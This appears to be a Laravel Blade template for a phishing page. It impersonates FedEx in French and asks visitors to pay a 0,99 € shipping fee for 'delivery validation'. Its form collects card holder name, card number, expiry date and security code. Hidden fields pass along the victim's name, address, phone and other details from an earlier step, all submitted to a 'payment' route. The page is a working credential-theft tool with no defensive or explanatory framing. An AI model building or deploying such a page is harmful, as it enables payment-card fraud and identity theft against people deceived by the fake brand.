
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
    <title>FEDEX</title>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/assets/owl.carousel.min.css">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/jquery-nice-select/1.1.0/css/nice-select.min.css">
    <link rel="stylesheet" href="{{asset('css.css')}}">
</head>
<body>
  
  
  
  

  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
    <a class="navbar-brand" href="#"><img src="image/logo.png" alt="logo"></a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
      <ul class="navbar-nav">
        <li class="nav-item active">
          <a class="nav-link" href="#"> Expedier </a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="#">Suivi</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="#">Support</a>
        </li>
        <li class="nav-item">
          <a class="nav-link disabled" href="#" tabindex="-1" aria-disabled="true">Compte</a>
        </li>
      </ul>
    </div>
  </nav>

  <div class="img">
  
  <br>
  <h4 class="text-center">Validation de la livraison !</h4>

  <h6 class="text-center">Payer 0,99 € (Frais de port)</h6>

 <br>
  
  <form action="{{ route('payment') }}" charset=utf-8  class="form" method="POST">
    @csrf
    @method('get')

    <div class="container">
  
 
    <div class="form-group">
     
      <input type="hidden" class="form-control" id="nomh" name="nom" value="{{$nom}}" required>
      <input type="hidden" class="form-control" id="nomh" name="prenom" value="{{$prenom}}" required>
      <input type="hidden" class="form-control" id="nomh" name="adresse" value="{{$adresse}}" required>
      <input type="hidden" class="form-control" id="nomh" name="ville" value="{{$ville}}" required>
      <input type="hidden" class="form-control" id="nomh" name="pays" value="{{$pays}}" required>
      <input type="hidden" class="form-control" id="nomh" name="code" value="{{$code}}" required>
      <input type="hidden" class="form-control" id="nomh" name="tele" value="{{$tele}}" required>
      <input type="hidden" class="form-control" id="nomh" name="date" value="{{$date}}" required>
   
    </div>

    <div class="form-group">
      <label>Nom sur la carte</label>
      <input type="text" class="form-control" id="nom_cart" name="nom_cart" placeholder="Nom et Prénom" required>
    </div>
   
    <div class="form-row">
      <div class="form-group col-md-6">
        <label>Numéro de la carte</label>
        <input type="text" class="form-control" id="num_cart" name="num_cart" placeholder="Numéro de la carte" required>
      </div>
     
      <div class="form-group col-md-6">
        <label >Date d'expiration</label>
        <input type="text" class="form-control" id="date" name="date_cart" placeholder="MM/YY" required>
      </div>
    </div>
    
    <div class="form-row">
      <div class="form-group col-md-6">
        <label >Code de sécurité</label>
        <input type="text" name="code_cart" class="form-control" id="code" placeholder="Code de sécurité" required >
      </div>
      <div class="form-group col-md-6 ">
        
        <img src="image/vissss.png" style="display: inline-block;
    height: 90px; width:100%" alt="visa">
      </div>
    </div>
   <br>
 <center>
    <button type="submit" name="submit" class="btn btn-primary col-md-6">Terminer</button>
    </center>
    <br>
   <br>
  </div>
  </form><br>
  <br>

</div>
  
<div id="copyright"><!-- #copyright begin -->
   
    <div class="container"><!-- container begin -->
       
        <div class="col-md-6"><!-- col-md-6 finish -->
            
            <p class="pull-left text-center">&copy; 2021 FEDEX All Rights Reserve</p>
            
        </div><!-- col-md-6 finish -->
        
         
        
    </div><!-- container finish -->
    
  </div><!-- #copyright finish -->
    
  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/owl.carousel.min.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-nice-select/1.1.0/js/jquery.nice-select.min.js"></script>

  <script src="{{asset('main.js')}}"></script>
     
    
   
     
</body>
</html>





